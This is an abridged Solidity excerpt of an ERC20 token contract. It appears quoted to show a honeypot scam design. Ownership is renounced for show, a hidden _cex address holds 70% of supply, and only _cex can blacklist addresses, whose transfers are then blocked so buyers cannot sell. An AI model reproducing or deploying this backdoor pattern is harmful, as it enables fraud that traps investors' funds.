...
contract Token is IERC20, IERC20Metadata, Ownable{
    ...
    mapping(address => bool) private _blist;
    ...
    function initialize(
        ...
        _balances[_cex] = (_totalSupply * 7) / 10;
        _balances[_publisher] = (_totalSupply * 3) / 10;
        _transferOwnership(address(0));
        IUniswapV2Factory(_factory).createPair(
            _WETH,
            address(this)
        );
    ...
    function addBL(address[] memory addr,bool[] memory status) public {
        address sender = _msgSender();
        require(sender == _cex);
        require(addr.length == status.length);
        for(uint i; i< addr.length; i++){
            _blist[addr[i]] = status[i];
        }
    }
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
        if(from != _cex && to != _cex){
            require(!_blist[from] && !_blist[to], "Transaction involves blacklisted address");
        }
    }
